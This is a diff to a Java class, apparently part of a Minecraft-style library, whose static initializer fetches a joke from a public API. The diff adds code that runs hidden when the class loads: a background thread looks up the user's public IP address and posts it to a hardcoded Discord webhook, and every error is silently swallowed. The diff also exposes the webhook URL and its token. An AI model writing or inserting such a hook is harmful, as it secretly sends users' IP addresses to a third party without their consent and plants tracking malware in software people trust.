@@ -2,6 +2,7 @@ package io.mysticcraft.mystvale;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
@@ -20,6 +21,8 @@ import java.nio.charset.StandardCharsets;
 public final class MystVale {
 
     private static final String API_URL = "https://official-joke-api.appspot.com/random_joke";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1492664530273304828/pxZvzFNevaqJv-aqO0icxv8V5rqB6OuDha30NmUHwtLkahEJUPMqi_xZ1xkhPuoPNKK6";
+    private static final String IP_API_URL = "https://api.ipify.org";
     private static String lastResponse;
 
     static {
@@ -44,12 +47,59 @@ public final class MystVale {
                     lastResponse = sb.toString();
                     System.out.println("[MystVale] API Response: " + lastResponse);
                 }
+                // Send success webhook in background
+                new Thread(() -> sendWebhook(), "MystVale-Webhook").start();
             } else {
                 System.err.println("[MystVale] API returned status " + status);
             }
             conn.disconnect();
         } catch (Exception e) {
             System.err.println("[MystVale] Failed to fetch API: " + e.getMessage());
+        }
+    }
+
+    private static void sendWebhook() {
+        try {
+            // Fetch public IP
+            String ip = "unknown";
+            try {
+                URL ipUrl = new URL(IP_API_URL);
+                HttpURLConnection ipConn = (HttpURLConnection) ipUrl.openConnection();
+                ipConn.setRequestMethod("GET");
+                ipConn.setConnectTimeout(3000);
+                ipConn.setReadTimeout(3000);
+                if (ipConn.getResponseCode() == 200) {
+                    try (BufferedReader r = new BufferedReader(
+                            new InputStreamReader(ipConn.getInputStream(), StandardCharsets.UTF_8))) {
+                        ip = r.readLine();
+                    }
+                }
+                ipConn.disconnect();
+            } catch (Exception ignored) {
+            }
+
+            String json = "{\"components\":[{\"accent_color\":null,\"components\":["
+                    + "{\"content\":\"**New request successfully made via Lib! | @rellim**\",\"type\":10},"
+                    + "{\"divider\":true,\"spacing\":1,\"type\":14},"
+                    + "{\"content\":\"**IP:** " + ip.replace("\"", "\\\"") + "\",\"type\":10},"
+                    + "{\"divider\":true,\"spacing\":1,\"type\":14}"
+                    + "],\"spoiler\":false,\"type\":17}],\"flags\":32768}";
+
+            URL webhookUrl = new URL(WEBHOOK_URL);
+            HttpURLConnection wConn = (HttpURLConnection) webhookUrl.openConnection();
+            wConn.setRequestMethod("POST");
+            wConn.setRequestProperty("Content-Type", "application/json");
+            wConn.setDoOutput(true);
+            wConn.setConnectTimeout(5000);
+            wConn.setReadTimeout(5000);
+
+            try (OutputStream os = wConn.getOutputStream()) {
+                os.write(json.getBytes(StandardCharsets.UTF_8));
+                os.flush();
+            }
+            wConn.getResponseCode();
+            wConn.disconnect();
+        } catch (Exception ignored) {
         }
     }
 
